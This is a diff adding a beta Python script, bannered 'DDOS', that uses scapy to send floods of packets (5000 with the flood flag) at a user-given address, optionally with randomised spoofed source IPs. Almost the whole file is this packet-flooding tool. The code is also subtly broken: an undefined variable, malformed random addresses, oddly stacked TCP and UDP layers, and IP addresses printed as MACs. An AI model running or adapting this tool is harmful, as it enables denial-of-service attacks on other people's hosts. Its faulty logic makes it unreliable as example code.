@@ -1,0 +1,94 @@
+'''
+- PLEASE NOTE THIS IS STILL IN BETA
+- ONLY HAVE DONE 1hr on this so far but have so much to put into this project
+'''
+
+#!/usr/bin/env python
+from optparse import OptionParser
+import subprocess
+
+from scapy.all import *
+import subprocess
+import time
+
+parser = OptionParser()
+parser.add_option("-u", "--url", dest="url",
+                  help="Enter a src addr")
+
+parser.add_option("-t", "--t", dest="ttl",
+                  help="TTL")
+
+parser.add_option("-w", "--write", dest="file",
+                  help="Output file")
+parser.add_option("-p", "--packets", dest="packets",
+                  help="Output file")
+parser.add_option("-r", "--random", dest="random",
+                  help="Generate a random IP addr", action="store_true")
+parser.add_option("-F", "--flood", dest="flood",
+                  help="Send flood pkts to addr", action="store_true")
+
+(option, args) = parser.parse_args()
+url = option.url
+import random as r
+flood = option.flood
+file = option.file
+random = option.random
+ttl = option.ttl
+packets = option.packets
+
+e = ['1','2','3','4','5','6','7','8','9','0']
+print("\n\n\033[1;32;40m")
+print("▓█████▄ ▓█████▄  ▒█████    ██████   |")
+print("▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒   |  Authoer: $wift_Glitxh")
+print("░██   █▌░██   █▌▒██░  ██▒░ ▓██▄     |")
+print("░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒  |  Version: 0.0.2")
+print("░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒  |")
+print(" ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  |")
+print(" ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░  |")
+print(" ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░    |")
+print("   ░       ░        ░ ░        ░    |")
+print("   ░       ░                        \033[1;37;40m")
+
+
+print("\n  [+] Scapy imported successfully\n")
+print('===================================\n')
+
+time.sleep(1)
+if not option.url:
+	parser.error("options -u/--url must be filled")
+else:
+	b = option.url
+	if not option.packets:
+		p = option.packets
+	print("[=] Starting ping....")
+	
+	print("--------------------------------------")
+	if option.random:
+		wow = (r.choice(e)+r.choice(e)+'.'+r.choice(e)+'.'+r.choice(e)+'.'+r.choice(e)+r.choice(e))
+		a = IP(src=wow, dst=b)/TCP(sport=440, dport=(440,470))
+		a.show()
+
+	if not option.random:
+		a = IP(dst=b)/TCP(sport=440, dport=(440))/UDP()/"This is a test ping :)"
+		a.show()
+
+	if option.ttl:
+		a = IP(dst=b, ttl=int(option.ttl))/TCP(sport=440, dport=(440))/UDP()/"This is a test ping :)"
+		
+	if not option.ttl:
+		a = IP(dst=b, ttl=64)
+	if option.flood:
+		time.sleep(2)
+		print("\033[1;31;40m[+] FLOODING STARTING....\033[1;37;40m")
+		time.sleep(4)
+		send(a, count=5000)
+	if option.packets:
+		send(a, count=int(option.packets))
+	elif not option.packets:
+		send(a, count=int(p))
+	if option.random:
+		a = IP(src=wow, dst=b)/TCP(sport=440, dport=(440,470))
+		print("[+] Sent Mac: ",a.src,"\n[!] Destination Mac: ", a.dst)
+	if not option.random:
+		
+		print("[+] Sent Mac: ",a.src,"\n[!] Destination Mac: ", a.dst)
